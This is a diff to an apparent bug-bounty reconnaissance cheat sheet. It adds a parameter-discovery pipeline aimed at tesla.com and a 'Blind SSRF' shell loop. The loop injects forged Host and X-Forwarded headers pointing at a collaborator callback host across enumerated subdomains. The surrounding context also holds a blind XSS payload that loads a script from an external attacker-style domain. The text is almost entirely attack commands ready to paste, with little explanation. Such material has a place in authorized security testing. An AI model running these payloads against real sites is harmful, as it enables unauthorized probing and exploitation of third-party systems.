@@ -89,6 +89,8 @@ gau DOMAIN <br>
 cat outfile.txt | gau | gf PATTERN | tee FILE.txt <br>
 <br>
 <h2>Param discovery</h2> <br>
+echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive <br>
+
 Run paramspider on target name to discover URLS and parameters - add to file name waybackurls.txt. <br>
 Run Arjun on direct URL endpoints to discover further Parameters in the URL request <br>
 <br>
@@ -157,6 +159,9 @@ Run socialhunter for social media broken links <br>
 <br>
 <h4> Blind XSS </h4><br>
 subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"<br>
+<br>
+<h4> Blind SSRF </h4><br>
+cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
 <br>
  
 <h1>QUICK WINS WORDLIST</h1><br>
